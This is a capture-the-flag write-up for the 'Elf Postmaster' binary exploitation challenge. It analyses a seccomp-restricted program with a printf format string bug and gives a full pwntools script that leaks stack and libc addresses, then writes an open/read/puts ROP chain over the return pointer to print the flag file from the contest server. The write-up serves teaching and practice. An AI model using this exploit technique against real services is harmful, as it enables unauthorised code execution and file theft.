# The Elf Postmaster
> Binary Exploitation 
--------------------

## Problem Statement
> Someone once said you can't get your wish granted without BOF, but they lacked vision. And a weird elf postmaster.  
> **Connect using: nc challs.xmas.htsp.ro 12003**  
> **Files:** [**main**](./main)

## Analysis
* Let's Try to read the Docker file
    >```shell
    >viperx7@computer $  cat Docker
    >FROM ubuntu:18.04
    ># [REDACTED]
    >``````
    > This might be a hint to what operating system they are using on the server

* Let's start our basic analysis
    >```shell
    > viperx7@computer $ file main
    >main: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, 
    >BuildID[sha1]=5dbf78cee5a8a99dea9aed4e50f34e8e5d365e90, stripped
    >```
    >
    >```shell
    > viperx7@computer $ checksec main 
    >[*] './x-mas_ctf/Pwn/the_elf_postmaster/main'
    >Arch:     amd64-64-little
    >RELRO:    Full RELRO
    >Stack:    Canary found
    >NX:       NX enabled
    >PIE:      PIE enabled
    >```
    > Things to remember
    >* **Striped**
    >* **Full Reload**
    >* **Canary enabled**
    >* **NX Enabled**

* Let's check the decompiled main
    >```C
    >undefined8 FUN_00100ae2(void)
    >{
    >  char *pcVar1;
    >  long in_FS_OFFSET;
    >  char local_118 [264];
    >  long local_10;
    >
    >  local_10 = *(long *)(in_FS_OFFSET + 0x28);
    >  FUN_0010097a();
    >  puts("Hello, who are you?");
    >  fgets(local_118,0x100,stdin);
    >  printf("Oh, greetings ");
    >  printf(local_118);
    >  puts("! Long time no see...");
    >  puts("Please, write your letter to Santa");
    >  while( true ) {
    >    pcVar1 = strstr(local_118,"end of letter");
    >    if (pcVar1 != (char *)0x0) break;
    >    fgets(local_118,0x100,stdin);
    >    printf("Okok, I am taking notes, so you said: ");
    >    printf(local_118);
    >  }
    >  printf("Bye, bye, see you next year!");
    >  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    >                    /* WARNING: Subroutine does not return */
    >    __stack_chk_fail();
    >  }
    >  return 0;
    >}
    >```

    >There is no bufferoverflow here, but we see that our input is reflected with printf  

    |we have a format string vulnerability here |
    ---  

* Now before jumping to exploit format strings lets have a look at the function thats being called before our input is processed
    >```c
    >void FUN_0010097a(void)
    >{
    >  long lVar1;
    >  undefined8 uVar2;
    >  long in_FS_OFFSET;
    >  
    >  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
    >  uVar2 = seccomp_init(0);
    >  seccomp_rule_add(uVar2,0x7fff0000,0xf,0);
    >  seccomp_rule_add(uVar2,0x7fff0000,0x3c,0);
    >  seccomp_rule_add(uVar2,0x7fff0000,2,0);
    >  seccomp_rule_add(uVar2,0x7fff0000,0x101,0);
    >  seccomp_rule_add(uVar2,0x7fff0000,0,0);
    >  seccomp_rule_add(uVar2,0x7fff0000,1,0);
    >  seccomp_rule_add(uVar2,0x7fff0000,3,0);
    >  seccomp_rule_add(uVar2,0x7fff0000,5,0);
    >  seccomp_rule_add(uVar2,0x7fff0000,0xe7,0);
    >  seccomp_load(uVar2);
    >  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
    >                    /* WARNING: Subroutine does not return */
    >    __stack_chk_fail();
    >  }
    >  return;
    >}
    >```
    > Looks like the binay uses seccomp filters  
    >>Seccomp is just like a firewall but instead it blocks specified syscalls

* Lets check what rules are inforced fu seccomp in our case 
    > We will use a tool called [seccomp-tool](https://github.com/david942j/seccomp-tools)
    > ```shell
    > viperx7@computer $ seccomp-tools dump ./main
    > line  CODE  JT   JF      K
    >=================================
    > 0000: 0x20 0x00 0x00 0x00000004  A = arch
    > 0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015
    > 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
    > 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
    > 0004: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0015
    > 0005: 0x15 0x08 0x00 0x00000000  if (A == read) goto 0014
    > 0006: 0x15 0x07 0x00 0x00000001  if (A == write) goto 0014
    > 0007: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0014
    > 0008: 0x15 0x05 0x00 0x00000003  if (A == close) goto 0014
    > 0009: 0x15 0x04 0x00 0x00000005  if (A == fstat) goto 0014
    > 0010: 0x15 0x03 0x00 0x0000000f  if (A == rt_sigreturn) goto 0014
    > 0011: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0014
    > 0012: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0014
    > 0013: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0015
    > 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW
    > 0015: 0x06 0x00 0x00 0x00000000  return KILL
    >```

    > Here we see that we are only allowed to execute the following syscalls
    >* **read**
    >* **write**
    >* **open**
    >* **close**
    >* **fstat**
    >* **rt_sigreturn**
    >* **exit**



## Solution
* Loadout `what do we have`

                                            Format String Vulnerability
                                         Operating system in use  Ubuntu 18.04
* Restrictions

                                    Can't execute systen from the binary (seccomp rule)
                                                Stack is not executable
                                                   Cannary is enabled
                                                  Full reload is enabld



* Target 

                                                    Read the flag file 


* Plan

                                        we will overwrite the return pointer 
                                                make a rop chain that
                                                    open the file
                                                   read the content
                                                   print the content





## Exploit
* Due to the nature of format string  attacks this script might need some tuning 
if using it on system other than Ubuntu 18.04
```python
#!/bin/env python3
print('starting')
from pwn import *
context.arch = 'amd64'
#context.log_level = 'critical'
host = 'challs.xmas.htsp.ro'
port = 12003

#binary = ELF('./main')
p=remote(host,port)
#p = process('./main')


p.recvline().decode('utf-8')
p.sendline(b'Junk')
p.recvline().decode('utf-8')
p.recvline().decode('utf-8')
p.recvline().decode('utf-8')


def fmt_str(write):
    p.sendline(write)
    return p.recvline().decode('utf-8').strip('\n').split(' ')[-1]


# a function that writes data to specified address
# dont use this directly writing large values on stack will take too much time
def raw_writer(what, where):
    address = p64(where)
    #print(address)
    
    
    # code to write large values to the stack
    value = str(int(what, 16))
    lval = len(value)
    padding = b'A'*(16 - lval - 5 - 2)
    print(len(padding),end='')
    value = str(int(value) - len(padding))
    
    # just some stupid edge cases
    expad = ""
    while len(value+expad) != lval and lval >50:
        expad += 'x'
        value = str(int(value) - 1)

    value = str(value+expad).encode()

    format_string = padding + b"%" + value + b"x" b'%8$n ' + address 


	# code to write smaller values like 0, 1, 10 to target
    if int(what,16) < 50:
        #print('altwrt')
        value = int(what,16)
        padding = b'B' * value
        padder = b'C' * (16-5-len(padding))
        format_string = padding + b'%8$n ' + padder + address 
    

    bad_check(address)
    format_string += b'\n'

    #input('send payload ??')
    p.sendline(format_string)
    return p.recvline()


# Writes large data to specified address using lots of small writes
# this makes it faster and stable
def write(what, where):
    val2wrt = what[2:]
    while len(val2wrt) % 4 != 0:
        val2wrt = '0' + val2wrt
    values = []
    for x in range(len(val2wrt)//4):
        values.append(val2wrt[4*x: 4*x+4])
    values = values[::-1]

    offsets = list(range(len(values)))
    

    # print(offsets)
    # print(values)
    for x in range(len(values)):
        # print('0x'+values[x])
        # print(where+x)
        raw_writer('0x'+values[x], where+2*offsets[x])


# determine the address of return pointer
address_return_pointer = int(fmt_str('%30$p'), 16)   - 0x10 # This line is libc specific
arp = address_return_pointer
log.success('Address or return pointer: ' + hex(arp))
################### Writable area in memory ########
writable_buffer = int(fmt_str('%30$p'), 16) - 0x128
buff = hex(writable_buffer)


################ check for bad characters ################
def bad_check(sym):
    try:                    # Byte string conversion
        sym = p64(int(sym,16))
    except:
        pass
    if b'\n' in sym:
        print(' Bad Char detected : quitting')
        #print(sym)
        exit()

###############################################################################
#################################### LIBC STUFF ###############################
###############################################################################

# Leaking libc base address
base = int(fmt_str('%41$p'), 16)
lba = base - 0x21b97                                # This line is libc specific
log.success('Libc base address: ' + hex(lba))

# Load Libc
#libc = ELF('/lib/libc-2.30.so')
libc=ELF('./libc-2.27.so')


# Symbol search for libc
def get_sym(symbol):
    p_sym = hex(libc.symbols[symbol] + lba)
    bad_check(p_sym)
    return hex(libc.symbols[symbol] + lba)


# Gagets search for libc
def get_gadget(snip):
    p_sym = hex(next(libc.search(asm(snip))) + lba)
    bad_check(p_sym)
    return hex(next(libc.search(asm(snip))) + lba)


# Strings
bin_sh = hex(lba + next(libc.search(b'/bin/sh')))

############ symbol s#######
system = get_sym('system')
opn = get_sym('open')
read = get_sym('read')
puts = get_sym('puts')
gets = get_sym('gets')
printf = get_sym('printf')


############ gadgets ######
pop_rdi = get_gadget('pop rdi; ret')
pop_rsi = get_gadget('pop rsi; ret')
pop_rdx_pop_rbx = get_gadget('pop rdx;pop rbx;ret')
ret = get_gadget('ret')
###############################################################################
###############################################################################


# input('exploit ?')

# ask for the path to flag file
write(pop_rdi, arp); arp +=8
write(buff, arp); arp +=8
write(gets, arp); arp +=8

#open
write(pop_rdi, arp); arp +=8
write(buff, arp); arp +=8
write(pop_rsi, arp); arp +=8
write('0x0000000000000000', arp); arp+=8
write(opn, arp); arp +=8

#read
write(pop_rdi, arp); arp +=8
write('0x0000000000000003', arp); arp+=8
write(pop_rsi, arp); arp +=8
write(buff, arp); arp +=8
write(pop_rdx_pop_rbx, arp); arp +=8
# write(pop_rdx, arp); arp +=8
write('0x0000000000000123', arp); arp+=8
write('0x0000000000000003', arp); arp+=8
write(read, arp); arp +=8

#puts
write(pop_rdi, arp); arp +=8
write(buff, arp); arp +=8
write(puts, arp); arp +=8

write(pop_rdi, arp); arp +=8
write(buff, arp); arp +=8
write(puts, arp); arp +=8

p.sendline(b'end of letter')
print(p.recvline())
p.sendline(b'flag.txt')

print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
```


